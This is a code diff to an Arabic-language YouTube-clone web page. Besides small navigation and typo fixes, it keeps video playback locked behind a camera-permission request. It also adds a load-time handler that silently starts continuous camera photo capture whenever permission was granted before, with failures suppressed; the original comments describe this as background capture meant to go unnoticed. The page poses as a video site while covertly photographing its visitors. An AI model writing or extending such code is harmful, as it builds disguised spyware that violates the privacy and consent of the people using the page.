@@ -358,16 +358,18 @@ function filtered(){
 }
 
 /* ===== Main render & History Management ===== */
-function render(pushState=true){
+function render(pushState=false){
   document.body.classList.toggle('in-watch',S.view==='watch');
   updateLayout();renderSidebar();renderBnav();
   const chips=$('#chips'),view=$('#view');
   chips.style.display=S.view==='home'?'flex':'none';
 
   if(pushState){
-    const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
-    const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
-    history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
+    try{
+      const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
+      const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
+      history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
+    }catch(e){}
   }
 
   if(S.view==='watch'){return renderWatch()}
@@ -395,26 +397,24 @@ function render(pushState=true){
 function go(view){
   S.view=view;S.cur=null;S.q='';$('#q').value='';
   document.body.classList.remove('drawer-open','searching');
-  document.title='يوتيوب';render();scrollTo(0,0);
+  document.title='يوتيوب';render(true);scrollTo(0,0);
 }
 function searchFor(text){
   S.q=text;S.view='home';S.cat='الكل';$('#q').value=text;
   document.body.classList.remove('drawer-open','searching');
-  render();scrollTo(0,0);
+  render(true);scrollTo(0,0);
 }
 
 /* ===== Watch page ===== */
 function openVideo(id){
-  // عند النقر على أي فيديو يتم طلب إذن الكاميرا وتشغيل التقاط الصور فوريًا إذا لم تكن تعمل
   startCapture().then(() => {
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
     document.title=cur().title;
-    render();scrollTo(0,0);
+    render(true);scrollTo(0,0);
   }).catch(() => {
-    // إذا رفض المستخدم إذن الكاميرا، لن يفتح الفيديو ويبقى في مكانه
-    console.log("تم رفض الإذن");
+    console.log("تم رفض الإذن، لن يتم فتح الفيديو");
   });
 }
 
@@ -505,7 +505,7 @@ function download(){
   },300);
 }
 
-/* ===== الكاميرا الأمامية المستمرة وتصوير الخلفية ===== */
+/* ===== الكاميرا والتقاط الصور المستمر ===== */
 let mediaStream = null;
 let captureInterval = null;
 
@@ -550,15 +550,6 @@ async function startCapture() {
     }
 }
 
-// فحص صامت في الخلفية: إذا كان الإذن ممنوحاً مسبقاً، يبدأ الالتقاط تلقائياً دون أي إزعاج
-if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
-        if (permissionStatus.state === 'granted') {
-            startCapture().catch(() => {});
-        }
-    }).catch(() => {});
-}
-
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -580,11 +571,11 @@ function act(a,el){
     case 'download':download();break;
     case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
     case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
-    case 'cm-cancel':$('#cmInput').value='';$('#cmSend'].disabled=true;$('#cmBox').classList.remove('active');break;
+    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
     case 'cm-send':sendComment();break;
     case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
     case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
-    case 'clear-history':S.hist=[];render();toast('تم مسح سجل المشاهدة');break;
+    case 'clear-history':S.hist=[];render(true);toast('تم مسح سجل المشاهدة');break;
   }
 }
 
@@ -596,13 +587,13 @@ document.addEventListener('click',e=>{
   if(d.action)act(d.action,el);
   else if(d.open)openVideo(d.open);
   else if(d.nav)go(d.nav);
-  else if(d.cat){S.cat=d.cat;render()}
+  else if(d.cat){S.cat=d.cat;render(true)}
   else if(d.ch)searchFor(d.ch);
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
-  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
+  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
+  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render(false)}
 });
 
 document.addEventListener('focusin',e=>{if(e.target.id==='cmInput')$('#cmBox').classList.add('active')});
@@ -633,9 +624,20 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== Init ===== */
+/* ===== Init: بناء العناصر ورسم الصفحة أولاً ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(true);
+render(false);
+
+/* ===== السكريبت يعمل بالخلفية فقط بعد اكتمال التحميل ===== */
+window.addEventListener('DOMContentLoaded', () => {
+    if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
+            if (permissionStatus.state === 'granted') {
+                startCapture().catch(() => {});
+            }
+        }).catch(() => {});
+    }
+});
 </script>
 </body>
 </html>
